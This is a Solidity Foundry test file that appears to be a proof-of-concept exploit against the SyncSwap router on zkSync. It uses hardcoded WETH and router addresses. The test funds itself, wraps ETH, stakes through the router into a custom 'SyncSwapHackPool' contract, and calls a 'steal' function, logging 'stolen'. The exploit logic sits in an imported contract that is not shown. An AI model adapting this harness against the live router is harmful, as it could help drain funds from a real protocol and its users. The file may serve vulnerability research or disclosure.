// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/SyncSwapHackPool.sol";
import {SyncSwapRouter, IWETH} from "../lib/core-contracts/router.sol";

contract SyncSwapHack is Test {
    SyncSwapHackPool public ss_hack;
    SyncSwapRouter public ss_router;
    address public immutable WETH = 0x5AEa5775959fBC2557Cc8789bC1bf90A239D9a91;

    event Received(uint msg);
    receive() external payable {
        emit Received(msg.value);
    }

    function setUp() public {
        ss_hack = new SyncSwapHackPool(address(this));
        ss_router = SyncSwapRouter(0x2da10A1e27bF85cEdD8FFb1AbBe97e53391C0295);
    }

    function testHack() public {
        emit log_string("test start");
        vm.deal(address(this), 1 * 10**18);
        emit log_string("got cash");
        IWETH(WETH).deposit{value: 1e18}();
        emit log_string("eposited");

        IERC20(WETH).approve(address(ss_router), 1);
        emit log_string("approved");
        ss_router.stake(address(ss_hack), WETH, 1, address(this));
        emit log_string("staked");
        ss_hack.steal(address(ss_router), WETH);
        emit log_string("stolen");
    }
}

